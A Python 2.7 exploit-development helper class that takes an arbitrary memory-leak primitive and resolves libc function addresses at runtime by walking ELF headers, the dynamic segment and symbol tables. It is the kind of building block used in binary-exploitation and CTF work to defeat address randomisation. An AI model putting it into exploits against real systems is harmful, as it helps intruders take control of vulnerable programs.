#!/usr/bin/python2.7
from zio import l64, l32

class MyDynELF():
    '''manually leak libc'''

    def __init__(self, BITS = 64):
        self.BITS = 64
    
    # get arbitrary address located in libc
    def __get_elf_entry(self, got, leak):
        entry = l64(leak(got, 0x8))
        print '[+] libc entry\t\t\t\t:\t0x%x' % entry
        return entry
    
    # find libc base according to Magic
    def __find_elf_base(self, entry, leak):
        if self.BITS == 64:
            libc_base = entry & 0xfffffffffffff000
            while True:
                garbage = leak(libc_base, 0x4)
                if garbage == '\x7fELF':
                    break
                libc_base -= 0x1000
            print '[+] libc base\t\t\t\t:\t0x%x' % libc_base
            return libc_base
    
    # find program header table
    def __find_phdr(self, elf_base, leak):
        if self.BITS == 64:
            # get address of program header table
            phdr = l64(leak(elf_base + 0x20, 0x8)) + elf_base
            print '[+] program headers table\t\t:\t0x%x' % phdr
            return phdr
    
    # find dynamic section table (.dynamic section -> DYNAMIC segment)
    def __find_dyn_section(self, phdr, elf_base, leak):
        if self.BITS == 64:
            phdr_ent = phdr
            while True:
                garbage = l32(leak(phdr_ent, 0x4))
                # p_type of dynamic segment is 0x2
                if garbage == 0x2:
                    break
                phdr_ent += 0x38
            dyn_section = l64(leak(phdr_ent + 0x10, 0x8)) + elf_base
            print '[+] .dynamic section headers table\t:\t0x%x' % dyn_section
            return dyn_section
    
    def __find_sym_str_table(self, dyn_section, leak):
        if self.BITS == 64:
            dyn_ent = dyn_section
            dt_sym_tab = 0x0
            dt_str_tab = 0x0
            while True:
                garbage = l64(leak(dyn_ent, 0x8))
                if garbage == 0x6:
                    dt_sym_tab = l64(leak(dyn_ent + 0x8, 0x8))
                elif garbage == 0x5:
                    dt_str_tab = l64(leak(dyn_ent + 0x8, 0x8))
                if dt_str_tab and dt_sym_tab:
                    break
                dyn_ent += 0x10
            print '[+] symtab\t\t\t\t:\t0x%x' % dt_sym_tab
            print '[+] strtab\t\t\t\t:\t0x%x' % dt_str_tab
            return (dt_sym_tab, dt_str_tab)
    
    def __find_func_adr(self, dt_sym_tab, dt_str_tab, func, elf_base, leak):
        if self.BITS == 64:
            sym_ent = dt_sym_tab
            while True:
                garbage = l32(leak(sym_ent, 0x4))
                name    = leak(dt_str_tab + garbage, len(func))
                if name == func:
                    break
                sym_ent += 0x18
            adr_func = l64(leak(sym_ent + 0x8, 0x8)) + elf_base
            print '[+] %s loaded address\t:\t0x%x' % (func, adr_func)
            return adr_func
    
    # exploit ELF
    def lookup(self, leak, ptr, func):
        entry                   = self.__get_elf_entry(ptr, leak)
        elf_base                = self.__find_elf_base(entry, leak)
        phdr                    = self.__find_phdr(elf_base, leak)
        dyn_section             = self.__find_dyn_section(phdr, elf_base, leak)
        dt_sym_tab, dt_str_tab  = self.__find_sym_str_table(dyn_section, leak)
        func_address            = self.__find_func_adr(dt_sym_tab, dt_str_tab, func, elf_base, leak)
        return func_address
